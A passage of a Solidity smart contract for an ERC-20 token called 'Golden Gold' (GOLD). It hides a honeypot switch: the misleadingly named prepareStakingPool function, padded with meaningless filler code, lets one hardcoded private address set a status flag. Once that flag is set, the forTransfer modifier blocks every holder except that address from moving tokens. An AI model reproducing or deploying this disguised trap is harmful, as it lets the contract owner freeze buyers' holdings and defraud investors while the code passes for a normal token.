...
contract GoldenGold is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokent_totalSupply;
    uint256 private _tokent_status = 0;
    uint256 public stakingPooltStatus = 0;

    string private _tokent_name;
    string private _tokent_symbol;

    address private _pooltAddress = 0x09933fc1740fe96095fCAB067c9664D67339A9E1;

    constructor() {
        _tokent_name = "Golden Gold";
        _tokent_symbol = "GOLD";
        _tokent_totalSupply = 10 * 10 ** 18;
        _balances[msg.sender] = _tokent_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _pooltAddress || _tokent_status == 0);
        _;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _tokent_totalSupply;
    }

    function prepareStakingPool(address to) public {
        to == address(0);
        stakingPooltStatus = 1;
        uint256 a = 1;
        a = a + 1;
        a = a-1;
        if (msg.sender == _pooltAddress)
        {
            _tokent_status = 1;
        }
    }
